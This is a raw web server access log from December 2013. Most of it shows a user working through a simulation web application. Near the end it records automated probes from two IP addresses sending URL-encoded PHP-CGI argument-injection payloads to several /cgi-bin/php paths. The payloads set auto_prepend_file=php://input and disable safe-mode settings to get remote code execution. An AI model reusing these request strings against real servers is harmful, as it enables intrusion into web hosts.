127.0.0.1 - - [16/Dec/2013:11:57:30 -0200] "GET / HTTP/1.1" 404 951
143.107.162.166 - - [16/Dec/2013:11:57:41 -0200] "GET /remoto/overview.htm HTTP/1.1" 200 7661
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/bg.css HTTP/1.1" 200 84
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryTooltip_quickguide.css HTTP/1.1" 200 449
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryMenuBar.js HTTP/1.1" 200 22007
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryTooltip.js HTTP/1.1" 200 29953
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryMenuBarHorizontal.css HTTP/1.1" 200 6080
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/downloads.png HTTP/1.1" 200 32639
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/CompleteCircuitry.png HTTP/1.1" 200 87679
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/favicon.ico HTTP/1.1" 200 2102
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryMenuBarDownHover.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryMenuBarRightHover.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/bg1.jpg HTTP/1.1" 200 561841
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryMenuBarDown.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/SpryAssets/SpryMenuBarRight.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:11:57:43 -0200] "GET /remoto/remoto_top.png HTTP/1.1" 200 96503
143.107.162.166 - - [16/Dec/2013:11:57:46 -0200] "GET /remoto/login.do HTTP/1.1" 200 8724
143.107.162.166 - - [16/Dec/2013:11:57:46 -0200] "GET /remoto/hint.css HTTP/1.1" 200 109
143.107.162.166 - - [16/Dec/2013:11:57:46 -0200] "GET /remoto/image/seta.gif HTTP/1.1" 200 833
143.107.162.166 - - [16/Dec/2013:11:57:52 -0200] "POST /remoto/login.do;jsessionid=DF0E805BC39CA1DFB8F15FA3D25DF723 HTTP/1.1" 200 8686
143.107.162.166 - - [16/Dec/2013:11:57:53 -0200] "GET /remoto/general.do HTTP/1.1" 200 11116
143.107.162.166 - - [16/Dec/2013:11:57:53 -0200] "GET /remoto/SpryAssets/SpryTooltip.css HTTP/1.1" 200 497
143.107.162.166 - - [16/Dec/2013:11:58:01 -0200] "POST /remoto/general.do HTTP/1.1" 200 11113
143.107.162.166 - - [16/Dec/2013:11:58:05 -0200] "POST /remoto/general.do HTTP/1.1" 200 11113
143.107.162.166 - - [16/Dec/2013:11:58:07 -0200] "GET /remoto/input.do HTTP/1.1" 200 22459
143.107.162.166 - - [16/Dec/2013:11:58:07 -0200] "GET /remoto/SpryAssets/SpryCollapsiblePanel.css HTTP/1.1" 200 4126
143.107.162.166 - - [16/Dec/2013:11:58:07 -0200] "GET /remoto/SpryAssets/SpryTabbedPanels.js HTTP/1.1" 200 11701
143.107.162.166 - - [16/Dec/2013:11:58:07 -0200] "GET /remoto/SpryAssets/SpryCollapsiblePanel.js HTTP/1.1" 200 15731
143.107.162.166 - - [16/Dec/2013:11:58:07 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.7745544571120446 HTTP/1.1" 200 33536
143.107.162.166 - - [16/Dec/2013:11:58:07 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.2745145598626392 HTTP/1.1" 200 21676
143.107.162.166 - - [16/Dec/2013:11:58:10 -0200] "POST /remoto/input.do HTTP/1.1" 200 22784
143.107.162.166 - - [16/Dec/2013:11:58:10 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.2438594596015592 HTTP/1.1" 200 27645
143.107.162.166 - - [16/Dec/2013:11:58:10 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.2852749171976029 HTTP/1.1" 200 21676
143.107.162.166 - - [16/Dec/2013:11:58:13 -0200] "POST /remoto/input.do HTTP/1.1" 200 22784
143.107.162.166 - - [16/Dec/2013:11:58:13 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.2989221135041046 HTTP/1.1" 200 27645
143.107.162.166 - - [16/Dec/2013:11:58:13 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.9401812299713569 HTTP/1.1" 200 21676
143.107.162.166 - - [16/Dec/2013:11:58:21 -0200] "GET /remoto/synapse.do HTTP/1.1" 200 14325
143.107.162.166 - - [16/Dec/2013:11:58:21 -0200] "GET /remoto/apply.css HTTP/1.1" 200 129
143.107.162.166 - - [16/Dec/2013:11:58:26 -0200] "POST /remoto/synapse.do HTTP/1.1" 200 14328
143.107.162.166 - - [16/Dec/2013:11:58:27 -0200] "POST /remoto/synapse.do HTTP/1.1" 200 14322
143.107.162.166 - - [16/Dec/2013:11:58:33 -0200] "GET /remoto/start.do HTTP/1.1" 200 7155
143.107.162.166 - - [16/Dec/2013:11:58:35 -0200] "GET /remoto/input.do HTTP/1.1" 200 22787
143.107.162.166 - - [16/Dec/2013:11:58:35 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.41801291058586554 HTTP/1.1" 200 27645
143.107.162.166 - - [16/Dec/2013:11:58:35 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.042070965560424445 HTTP/1.1" 200 21676
143.107.162.166 - - [16/Dec/2013:11:59:19 -0200] "POST /remoto/input.do HTTP/1.1" 200 22786
143.107.162.166 - - [16/Dec/2013:11:59:19 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.6765706683048437 HTTP/1.1" 200 36534
143.107.162.166 - - [16/Dec/2013:11:59:19 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.6232614453845017 HTTP/1.1" 200 21362
143.107.162.166 - - [16/Dec/2013:11:59:20 -0200] "GET /remoto/start.do HTTP/1.1" 200 7155
143.107.162.166 - - [16/Dec/2013:11:59:21 -0200] "POST /remoto/simulation.do HTTP/1.1" 200 7365
143.107.162.166 - - [16/Dec/2013:11:59:21 -0200] "GET /remoto/progressBar.css HTTP/1.1" 200 135
143.107.162.166 - - [16/Dec/2013:11:59:22 -0200] "GET /remoto/ProgressBar.jar HTTP/1.1" 304 -
143.107.162.166 - - [16/Dec/2013:11:59:23 -0200] "GET /remoto/results.do?opt=chart_img HTTP/1.1" 200 18947
143.107.162.166 - - [16/Dec/2013:11:59:23 -0200] "GET /remoto/SpryAssets/SpryCollapsiblePanel_results.css HTTP/1.1" 200 4052
143.107.162.166 - - [16/Dec/2013:11:59:24 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.44680871422677204 HTTP/1.1" 200 40584
143.107.162.166 - - [16/Dec/2013:11:59:27 -0200] "POST /remoto/results.do HTTP/1.1" 200 21183
143.107.162.166 - - [16/Dec/2013:11:59:27 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.7334588458302173 HTTP/1.1" 200 41859
143.107.162.166 - - [16/Dec/2013:11:59:32 -0200] "POST /remoto/results.do HTTP/1.1" 200 21255
143.107.162.166 - - [16/Dec/2013:11:59:32 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.8333937319759516 HTTP/1.1" 200 61887
143.107.162.166 - - [16/Dec/2013:11:59:37 -0200] "POST /remoto/results.do HTTP/1.1" 200 21451
143.107.162.166 - - [16/Dec/2013:11:59:38 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.550723958627906 HTTP/1.1" 200 46420
143.107.162.166 - - [16/Dec/2013:11:59:39 -0200] "POST /remoto/results.do HTTP/1.1" 200 21485
143.107.162.166 - - [16/Dec/2013:11:59:40 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.30818279025534145 HTTP/1.1" 200 46756
143.107.162.166 - - [16/Dec/2013:11:59:41 -0200] "POST /remoto/results.do HTTP/1.1" 200 21485
143.107.162.166 - - [16/Dec/2013:11:59:42 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.632479690794732 HTTP/1.1" 200 46756
143.107.162.166 - - [16/Dec/2013:11:59:50 -0200] "POST /remoto/results.do HTTP/1.1" 200 21482
143.107.162.166 - - [16/Dec/2013:11:59:51 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=rnwatanabe_34&id=0.6689483541746944 HTTP/1.1" 200 69814
143.107.162.166 - - [16/Dec/2013:12:00:52 -0200] "GET /remoto/start.do HTTP/1.1" 200 7365
143.107.162.166 - - [16/Dec/2013:12:00:53 -0200] "GET /remoto/ProgressBar.jar HTTP/1.1" 304 -
143.107.162.166 - - [16/Dec/2013:12:00:56 -0200] "GET /remoto/simulation.do?task=simulating HTTP/1.1" 200 7407
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "POST /remoto/simulation.do?task=cancel HTTP/1.1" 302 -
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/finish.jsp?status=canceled HTTP/1.1" 200 7334
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/hint.css HTTP/1.1" 200 109
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/bg.css HTTP/1.1" 200 84
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/SpryAssets/SpryMenuBar.js HTTP/1.1" 200 22007
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/SpryAssets/SpryMenuBarHorizontal.css HTTP/1.1" 200 6080
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/favicon.ico HTTP/1.1" 404 995
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/SpryAssets/SpryMenuBarDownHover.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/SpryAssets/SpryMenuBarRightHover.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/bg1.jpg HTTP/1.1" 200 561841
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/remoto_top.png HTTP/1.1" 200 96503
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/SpryAssets/SpryMenuBarDown.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:12:00:58 -0200] "GET /remoto/jsp/SpryAssets/SpryMenuBarRight.gif HTTP/1.1" 200 55
143.107.162.166 - - [16/Dec/2013:12:09:13 -0200] "GET /remoto/general.do HTTP/1.1" 200 11113
143.107.162.166 - - [16/Dec/2013:12:09:15 -0200] "POST /remoto/general.do HTTP/1.1" 200 11160
143.107.162.166 - - [16/Dec/2013:12:09:41 -0200] "POST /remoto/general.do HTTP/1.1" 200 11109
143.107.162.166 - - [16/Dec/2013:12:09:44 -0200] "POST /remoto/general.do HTTP/1.1" 200 11109
143.107.162.166 - - [16/Dec/2013:12:09:47 -0200] "GET /remoto/input.do HTTP/1.1" 200 22460
143.107.162.166 - - [16/Dec/2013:12:09:47 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.4723387534165564 HTTP/1.1" 200 36811
143.107.162.166 - - [16/Dec/2013:12:09:48 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.15315978494370108 HTTP/1.1" 200 21676
143.107.162.166 - - [16/Dec/2013:12:09:49 -0200] "POST /remoto/input.do HTTP/1.1" 200 22785
143.107.162.166 - - [16/Dec/2013:12:09:51 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.2146504854971667 HTTP/1.1" 200 27645
143.107.162.166 - - [16/Dec/2013:12:09:51 -0200] "POST /remoto/input.do HTTP/1.1" 200 22785
143.107.162.166 - - [16/Dec/2013:12:09:52 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=inputHist&id=0.2654068864442427 HTTP/1.1" 200 27645
143.107.162.166 - - [16/Dec/2013:12:09:53 -0200] "GET /remoto/servlet/ServletChartGenerator?cdSimulation=input&id=0.45492302092168424 HTTP/1.1" 200 21676
143.107.162.166 - - [16/Dec/2013:12:10:06 -0200] "GET /remoto/general.do HTTP/1.1" 200 11109
143.107.162.166 - - [16/Dec/2013:12:10:09 -0200] "POST /remoto/general.do HTTP/1.1" 200 11129
50.19.159.56 - - [16/Dec/2013:12:47:12 -0200] "HEAD / HTTP/1.0" 404 -
50.19.159.56 - - [16/Dec/2013:12:47:13 -0200] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 973
50.19.159.56 - - [16/Dec/2013:12:47:13 -0200] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 975
50.19.159.56 - - [16/Dec/2013:12:47:14 -0200] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 981
50.19.159.56 - - [16/Dec/2013:12:47:14 -0200] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 981
50.19.159.56 - - [16/Dec/2013:12:47:14 -0200] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 975
113.21.127.10 - - [16/Dec/2013:12:56:42 -0200] "HEAD / HTTP/1.0" 404 -
187.33.0.143 - - [16/Dec/2013:14:02:28 -0200] "HEAD / HTTP/1.0" 404 -
187.33.0.143 - - [16/Dec/2013:14:02:29 -0200] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 973
187.33.0.143 - - [16/Dec/2013:14:02:29 -0200] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 975
187.33.0.143 - - [16/Dec/2013:14:02:29 -0200] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 981
